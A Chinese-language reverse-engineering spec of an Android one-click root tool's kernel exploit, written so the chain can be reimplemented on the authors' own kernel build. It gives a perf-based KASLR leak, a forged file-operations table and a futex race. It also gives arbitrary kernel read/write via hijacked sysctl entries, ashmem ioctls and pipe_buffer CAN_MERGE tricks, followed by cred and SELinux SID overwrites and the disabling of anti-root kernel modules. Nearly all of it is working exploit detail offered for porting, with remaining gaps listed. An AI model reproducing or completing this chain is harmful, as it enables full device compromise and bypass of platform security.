# glpreload (一键root v1.6) 完整链路反汇编规格

对象：`assets/glpreload`（6,470,288 B, sha256 4980bb4f…），ELF64 AArch64 PIE，BIND_NOW，.text va=0x623f84 size=0x73ac，.rodata 6.4 MB（含静态链入的 ksud + kernelsu.ko 镜像）。
反汇编：`llvm-objdump -d --no-show-raw-insn --start-address=0x623f84 --stop-address=0x62b400 _glpreload`。
KIMAGE_VADDR = 0xffffffc008000000；下文 offset 均为 link 地址减 KIMAGE。

## 1. 调用总序（exploit_main @0x626b78）
1. init_ashmem_path() @0x62565c
2. slide = g+0xf38 缓存；否则 get_kaslr_offset() @0x6297c8；返回 0 → **直接 return（无退路）**
3. kaslr_base@0x637028 = slide + 0xffffff8000000000；kaslr_done=1
4. 填 fops@0x637038（0x100 B）
5. stage=1；cfg = slide+0xa6f7e18；run_one({a=cfg+8, b=slide+0xa55a110})  → ret
6. is_kernel_ptr(ret) 假 → 收尾
7. stage=2；cfg += 0x20；run_one({a=ret+0x208, b=slide+0xa53c2c0})
8. kernel_write_data(fd, ret+0x210, &(slide+0x7bb14c), 8)
9. kernel_read_data(fd, slide+0xa45dc60, &w, 4)：w==1 → 写 0 并打印 sig_enforce reset
10. proof_addr@0x637018 = data_addr(slide+0xa6f7e18+0x100)；install_pipe_physrw(fd)
11. kernel_write_data(fd, slide+0xa6f7e18, zeros, 0x1000) 必须 ==0x1000 → disable_antiroot_mod() → install_android_root(fd)
12. 收尾：reset_pipe_attempt / sysctl_destroy / close / kill(owner_tid, 10)

## 2. get_kaslr_offset（perf callchain 投票）
- perf_event_open(241, attr)：type=0, size=0, config=0, sample_period=0x186a0, sample_type=0x23(IP|TID|CALLCHAIN), flags+0x28=0x21(disabled|exclude_kernel), +0x6c=0x20
- mmap 8192；ioctl 0x2403(RESET)/0x2400(ENABLE)；循环 syscall(172=getpid) 2,000,000 次；ioctl 0x2401(DISABLE)
- 环：head@+0x400、tail@+0x408；rec=pg+0x1000+(tail&0xfff)；type!=9 时 tail+=rec[6]；ip=rec+8；callchain nr=rec+0x18，地址从 rec+0x20，最多 0x40 个，只收 ≥0xffff800000000000
- 判定：slide = ip + delta + imm，要求 (slide>>40)==0；12 条 (key, base_reg, imm)：
  1 0x113e0 / 0x3ff7feea7c / +0x1a4 ·活   2 0x700dc / 0x3ff7f8fecc / +0x58 ·死
  3 0x14c578 / 0x3ff7eb3a88 / +0 ·活      4 0xa1a58 / 0x3ff7b5e550 / +0x58 ·活
  5 0x6b3f4 / 0x3ff6f94afc / +0x110 ·活   6 (0x6b3f4+0xe4) / 0x3ff6f94afc / +0x2c ·死
  7 (0x113e0+0x1a4) / 0x3ff7feea7c / +0 ·活  8 (0x700dc+0x58) / 0x3ff7f8fecc / +0 ·死
  9 (0xa1a58+0x58) / 0x3ff7b5e550 / +0 ·死   10 (0x6b3f4+0x110) / 0x3ff6f94afc / +0 ·死
  11 (0x6b3f4+0x44) / 0x3ff6f94afc / +0xcc ·死 12 (0xa1a58+0x3c) / 0x3ff7b5e550 / +0x1c ·死
- 投票表 128 项 × 16 B {slide u64, count u32}；n==0 → 0；n<2 → idx0；否则取 count 最大。

## 3. 伪造 fops 表（0x637038）
- +0x08 = slide+0x7bb14c；+0xe0 = +0x1c0 → slide+0x7bb30c
- +0x60 = slide+0x478b40；+0x70 = +0x230 → 0x478d70；+0x80 = +0x2b8 → 0x478df8
- +0x20 = { slide+0x85f454, slide+0x85f984 }（rodata 0x1840 两字面值）
- +0x50 = { slide+0x477f84, slide+0x7bb2b4 }（rodata 0x1800 两字面值）

## 4. 三线程（race.c）
- waiter(0x626414)：bind cpu0、nice -20；发布 tid@0xfd0；FUTEX_WAKE(0xfe0)；0xfe4=1；等 0xfe8；clock_gettime+5s；0xfec=1；FUTEX_WAIT_BITSET(0xfe0, &ts, bitset=0xff4)；FUTEX_WAKE(0xfe0)；puts；**sig_stack_copy()**；puts；FUTEX_WAKE(0xfe0)；FUTEX_WAIT(&[0x633e6c],0,&ts)；fprintf(stderr,…)；0xff8=1；若 stage==1 → 无限 signal(SIGUSR1)+ppoll_from_regs(fops 副本)。
- owner(0x62669c)：0xffc=1；nice +19；FUTEX_WAKE(0xff4)；等 0xfe4；0xfe8=1；FUTEX_WAKE(0xfe0)；while(!g_owner_stop) pause()；FUTEX_WAKE ×2；0xffc=0。
- consumer(0x626218)：bind cpu1、nice -20；轮询 0xfc0；命中后 sleep(1)、(命中==1→usleep 50000)；读 owner_tid、0xfd4++、0xfc4++；等 0xfc8；sched_setattr_tid(owner,-19) 存 ret；**stage==2 → fd=open_ashmem()、g+0xe68=fd、kernel_write_data(fd, slide+0xa53c2c0, &(slide+0x9274ad8), 8)**；0xfdc+=ret==0；0xfcc=1。
- ghostlock_main(0x6267ac)：cpubind_init→bind(2)→建 3 线程（detached）→等 0xfec&&0xfe8→futex(0xff0,op=12,1,1,&0xff4)→等 0xff8（≤60 s）→cpubind_shutdown→stage==2 返回 1，否则返回 **sysctl_read(-1,NULL)**。
- sig_stack_copy(0x625edc)：造 rt_sigframe，[frame+0x30]=slide+init_task，regs 里放 g_cfg 三项，svc rt_sigreturn(x8=139) → 恢复点 0x62615c 里等 0xfc4 后置 0xfc8、等 0xfcc、清 0xfc0。

## 5. 内核读写原语
- **ctl_table 劫持**：sysctl_read(fd,target) 用 kernel_write_data 把 {data=target,maxlen=8} 写进 `tcp_comp_sack_delay_ns` 表项（他 0xa55a110），再 pread 该 /proc 文件 → strtoul 得该地址 8 字节；sysctl_destroy 写回原 data（他 0xa733080）。target=0 时只读不写。
- **ashmem ioctl 0x41007701（ASHMEM_SET_NAME）原始 write**：0x80 结构 A 的 +0x5d=addr、+0x65=len；256 B 缓冲 B 以 'A' 铺底再用 max(A,1) 覆盖、B[0x90]=0；ioctl → 然后 A 的 0x80..0 逐零字节截断重发；末尾 pwrite(fd,buf,len,0)。read 侧：x22=(0x6d6873612f766564 - len)，A+0x25=addr-x22，末尾 pread(fd,out,len,x22)。
- **pipe 物理读写**：pipe_phys_read/write(fd, &pipe_fds, pipebuf_addr, addr, buf, len)，页内偏移需 8 字节对齐且 <0xff8；install_pipe_physrw 用 23 B 证明串 + addr+0x100 写 "nebusec1" + 读回比对 "17372737"/"3727731" 家族做四连自校验（错误码 0x1e8/0x1ec/0x1f0/0x1f4）。
- **冷启锚点**：kernelsnitch_param(0x400,3,pagesize*2,0x10,1,0) → mm* → +0x338 owner → +0x878 files → +0x20 fdt → +0x8 fd_array → 存 g+0x158；再 sysctl_read(g+0x158+pipe_fd0*8) → struct file* → +0xd8 private_data → +0xa8 bufs → g+0x160。

## 6. 提权本体（cred.c）
- spawn_root_child：mmap 0x48 共享页 + pipe + fork；子 prctl("ll_root_child")、写 1 字节、等 shm[0]、组 0x40 结果、/system/bin/sh -c $PPG_ROOT_CMD 或写 shm+8 后 _exit(getuid()!=0)。
- 取 task：anchor = slide+init_task(+0x20bf6c0)；prev = kernel_read64(data_addr(anchor)+8)；task = prev-0x550；pid 比对 +0x634、tgid +0xe4、comm +0x848(16B)；不中则 find_task_by_tgid 沿 tasks.next 走 ≤0x1001 节点。
- cred：real_cred=task+0x830、cred=task+0x838；security=cred+0x78；blob 偏移 = pipe_read32(data_addr(selinux_blob_sizes)+0x6d0)。
- patch_cred_identity：cred+0x04 写 32 B 0（八 id）；+0x24 写 4 B 0；+0x28 写 40 B 0x1FFFFFFFFFF（五 cap 组）并读回逐条校验。patch_cred_sid：sec+blob_off 写 8 B {osid=1, sid=1}(SECINITSID_KERNEL)。
- 收尾清 task 标志：task[0] &= ~0x800、task+0x5f0 &= ~1、task+0x900/0x904 4 B 0、task+0x908 8 B 0，读回校验。
- disable_antiroot_mod：module_find_by_name("rscan") → module_section_range(mod,3) → start+0x860 写 24 B 0x01000000 模式；"kernel_stp" → start+0x78 写 8 B 0。
- 最后 handoff ksud（我方替换其内嵌 LKM 路径）。

## 7. 仍需的输入（无法从该二进制推出）
1. 目标 build 的 `init_task`、`selinux_state`、`selinux_blob_sizes`、`anon_pipe_buf_ops` 四槽、`tcp_comp_sack_delay_ns` 表项槽位与原 data —— 全部 .data/.bss，逐 build 不同（他 0x20bf6c0 / 0x26eca40 / 0x15f0e68 / 0x255a110 vs 我方 0x21e1780 / 0x2827fa8 / 0x16d5dc8 / 0x267fd80）。
2. stage2 的 K1/K2（他 0xa53c2c0 → 写 slide+0x9274ad8）：落在 printk 内部暂存区与镜像外地址，语义不可推。
3. 0xa45dc60（sig_enforce 开关）、0xa6f7e18（cfg 暂存页 = __log_buf 内）、data_addr 基准 0x15fffa0：同属 printk 内部布局，逐 build 变。
4. `ppoll_from_regs` / kernelsnitch 四件套 的内部细节（本次未逐指令读完）。

结论：这套链只要拿到目标 build 的 `Image`/`boot.img`，上面 4 项可以一次性全部算出（文本锚点跨 build 一致，已用我方 6.1.128 Image 验证 5 条全中）。
## 8. ashmem ioctl 0x41007701 与 pipe 物理读写的精确实现（本轮新解，可 1:1 落地）
### 8.1 常量全部是「完整链接地址」
`text_addr(va) = g.slide + va`，其中 slide = 运行基址 - 0xffffffc008000000。所以代码里的立即数都是 `0xffffffc0...` 的完整 VA，例如 cfg = `0xffffffc00a6f7e18`（= KIMAGE+0x26f7e18）、ctl 槽 = `0xffffffc00955a110`（KIMAGE+0x155a110 那段）、pipe ops = `0xffffffc0090f3110`。之前笔记里写的 0x26f7e18 是去掉 KIMAGE 的偏移，落码时不能直接用。
### 8.2 kernel_write_data(fd, addr, buf, len) @0x625b70
- 结构 A（栈 sp+0x10，0x80 B 全零）：`A+0x4d = addr`（stur x1,[sp,#0x5d]）、`A+0x55 = (u32)len`（stur w19,[sp,#0x65]）。
- 缓冲 B（sp+0x90，0x100 B）：先 `B[0..0x80] = A[i] ? A[i] : 1`（umax v.16b 逐字节取 max 1）、`B[0x80] = 0`、`B[0x81..0x100] = 0x41('A')`。
- `ioctl(fd, 0x41007701, B)`（x2 = B 地址，返回非 0 直接 -1）。
- 随后从 i=0x80 向下扫 A：遇到 `A[i]==0` 就重建 B 并把 `B[i]=0` 截断、再 `ioctl` 一次（最多 127 次）。
- 收尾 `pwrite(fd, buf, len, 0)`；`*errno = 0`。
### 8.3 kernel_read_data(fd, addr, out, len) @0x6258f0
- 结构 A 在 sp+0x20：magic = `0x6d6873612f766564`（内存字节 `dev/ashm`）；`off = magic - len`；`A+0x05 = addr - off`（stur x8,[sp,#0x25]）。
- B 构建与 ioctl 完全同上（B 在 sp+0xa0）。
- 收尾 `pread(fd, out, len, off)`。
### 8.4 pipe_phys_read @0x628ce4 / pipe_phys_write @0x628de8
读：`kernel_read_data(fd, pipebuf, raw, 0x28)` → 复制 raw → 改 4 个字段 → `kernel_write_data(fd, pipebuf, np, 0x28)` → `read(pipe_fds[0], out, len)` → 把 raw 写回 pipe_buffer 复原。字段算式：
- `np.page = 0xfffffffe00000000 + (((addr + 0x8000000000) >> 12) << 6)`（= vmemmap + pfn*sizeof(page)，pfn 以 PAGE_OFFSET 0xffffff8000000000 为基）
- `np.off = addr & 0xfff`；`np.len = len + 1`（读）/ `0`（写，配 CAN_MERGE 追加）
- `np.ops = text_addr(0xffffffc0090f3110)`（pipe_buf_ops）；`np.flags = 0x10`（PIPE_BUF_FLAG_CAN_MERGE）；`np.priv = 0`
写：同构，只是 `np.len = 0` 且收尾 `write(pipe_fds[1], buf, len)`。
### 8.5 包装层的边界条件（照抄）
- `pipe_read64/pipe_write64`：要求 `pipebuf_addr != 0`、`is_direct_ptr(addr)`、`(addr & 0xfff) <= 0xff8`。
- `pipe_read32`：同样要求 `(addr & 0xfff) <= 0xffc`。
- `pipe_read_data/write_data`：只要求 `(addr&0xfff) + len <= 0x1000`。
- `is_kernel_ptr(p) = p > 0xffff7fffffffffff`；`is_direct_ptr(p) = (p >> 36) == 0xffffff8`。
### 8.6 data_addr 的常数来源
`data_addr(va)`：若缓存 data_offset 为 0，则 `v0 = kernel_read64(text_addr(0xffffffc0095fffa0))`、`v1 = kernel_read64(text_addr(0xffffffc0095fffa0+0xa8))`，`data_offset = slide - v0 - v1 - 0x8000000000`。
### 8.7 尚未逐指令读完的两块（要跑通这两支，这两块必须补）
1. `ppoll_from_regs` + SIGUSR1 handler（stage1 的核心，配合伪造 fops 表产生第一次内核指针）。
2. `kernelsnitch_param/setup/find_collisions/bruteforce/__mm_leak`（冷启拿 `struct mm_struct*`，绕开 fd_array 缓存）。
